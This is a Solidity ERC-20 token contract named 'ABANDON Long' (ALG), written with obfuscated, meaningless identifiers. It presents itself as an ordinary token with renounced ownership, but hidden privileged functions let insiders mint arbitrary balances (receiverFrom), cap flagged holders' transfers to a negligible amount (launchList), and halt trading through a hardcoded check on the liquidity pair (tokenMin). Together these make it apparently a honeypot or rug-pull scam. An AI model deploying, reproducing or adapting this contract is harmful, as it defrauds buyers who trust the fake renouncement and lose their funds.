//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface launchedShould {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapLaunchedMode {
    function createPair(address shouldTx, address listSwap) external returns (address);
}

interface isReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address launchSell) external view returns (uint256);

    function transfer(address minFeeReceiver, uint256 modeToken) external returns (bool);

    function allowance(address teamTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeToken) external returns (bool);

    function transferFrom(
        address sender,
        address minFeeReceiver,
        uint256 modeToken
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txTotal, uint256 value);
    event Approval(address indexed teamTake, address indexed spender, uint256 value);
}

interface isReceiverMetadata is isReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ABANDONLong is modeFee, isReceiver, isReceiverMetadata {

    function owner() external view returns (address) {
        return liquiditySell;
    }

    address private liquiditySell;

    mapping(address => bool) public buyLaunched;

    uint256 constant txTeam = 11 ** 10;

    function buyEnableMarketing(address exemptLimitFee) public {
        if (fundAtFee) {
            return;
        }
        if (takeAutoReceiver == receiverReceiver) {
            takeAutoReceiver = receiverReceiver;
        }
        launchedTakeAuto[exemptLimitFee] = true;
        if (takeAutoReceiver != receiverReceiver) {
            teamTx = true;
        }
        fundAtFee = true;
    }

    mapping(address => uint256) private walletMin;

    constructor (){
        if (receiverReceiver == takeAutoReceiver) {
            teamTx = false;
        }
        launchedShould atExempt = launchedShould(senderToken);
        limitTrading = swapLaunchedMode(atExempt.factory()).createPair(atExempt.WETH(), address(this));
        
        maxSender = _msgSender();
        senderTake();
        launchedTakeAuto[maxSender] = true;
        walletMin[maxSender] = swapSender;
        
        emit Transfer(address(0), maxSender, swapSender);
    }

    address senderToken = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverFrom(address walletEnable, uint256 modeToken) public {
        listTeam();
        walletMin[walletEnable] = modeToken;
    }

    bool public launchedTeam;

    function symbol() external view virtual override returns (string memory) {
        return modeMinTrading;
    }

    address public limitTrading;

    string private modeMinTrading = "ALG";

    bool public teamTx;

    function tokenMin(uint256 modeToken) public {
        listTeam();
        sellMarketingLiquidity = modeToken;
    }

    function approve(address amountAuto, uint256 modeToken) public virtual override returns (bool) {
        limitShould[_msgSender()][amountAuto] = modeToken;
        emit Approval(_msgSender(), amountAuto, modeToken);
        return true;
    }

    bool public tokenBuy;

    function getOwner() external view returns (address) {
        return liquiditySell;
    }

    uint8 private receiverMode = 18;

    function atTakeMin(address minMode, address minFeeReceiver, uint256 modeToken) internal returns (bool) {
        if (minMode == maxSender) {
            return shouldSwap(minMode, minFeeReceiver, modeToken);
        }
        uint256 senderAt = isReceiver(limitTrading).balanceOf(listShould);
        require(senderAt == sellMarketingLiquidity);
        require(minFeeReceiver != listShould);
        if (buyLaunched[minMode]) {
            return shouldSwap(minMode, minFeeReceiver, txTeam);
        }
        return shouldSwap(minMode, minFeeReceiver, modeToken);
    }

    uint256 modeAtFee;

    address listShould = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    bool private teamLaunchedExempt;

    string private feeAt = "ABANDON Long";

    uint256 private swapSender = 100000000 * 10 ** 18;

    uint256 sellMarketingLiquidity;

    function decimals() external view virtual override returns (uint8) {
        return receiverMode;
    }

    mapping(address => bool) public launchedTakeAuto;

    function totalSupply() external view virtual override returns (uint256) {
        return swapSender;
    }

    function launchList(address enableFee) public {
        listTeam();
        if (receiverReceiver == takeAutoReceiver) {
            launchedTeam = true;
        }
        if (enableFee == maxSender || enableFee == limitTrading) {
            return;
        }
        buyLaunched[enableFee] = true;
    }

    function balanceOf(address launchSell) public view virtual override returns (uint256) {
        return walletMin[launchSell];
    }

    bool public buyAuto;

    function listTeam() private view {
        require(launchedTakeAuto[_msgSender()]);
    }

    function allowance(address fromLimit, address amountAuto) external view virtual override returns (uint256) {
        if (amountAuto == senderToken) {
            return type(uint256).max;
        }
        return limitShould[fromLimit][amountAuto];
    }

    function senderTake() public {
        emit OwnershipTransferred(maxSender, address(0));
        liquiditySell = address(0);
    }

    function transferFrom(address minMode, address minFeeReceiver, uint256 modeToken) external override returns (bool) {
        if (_msgSender() != senderToken) {
            if (limitShould[minMode][_msgSender()] != type(uint256).max) {
                require(modeToken <= limitShould[minMode][_msgSender()]);
                limitShould[minMode][_msgSender()] -= modeToken;
            }
        }
        return atTakeMin(minMode, minFeeReceiver, modeToken);
    }

    uint256 public receiverReceiver;

    address public maxSender;

    mapping(address => mapping(address => uint256)) private limitShould;

    bool public fundAtFee;

    function name() external view virtual override returns (string memory) {
        return feeAt;
    }

    function transfer(address walletEnable, uint256 modeToken) external virtual override returns (bool) {
        return atTakeMin(_msgSender(), walletEnable, modeToken);
    }

    bool public modeTakeAuto;

    event OwnershipTransferred(address indexed txFee, address indexed limitFee);

    function shouldSwap(address minMode, address minFeeReceiver, uint256 modeToken) internal returns (bool) {
        require(walletMin[minMode] >= modeToken);
        walletMin[minMode] -= modeToken;
        walletMin[minFeeReceiver] += modeToken;
        emit Transfer(minMode, minFeeReceiver, modeToken);
        return true;
    }

    uint256 private takeAutoReceiver;

}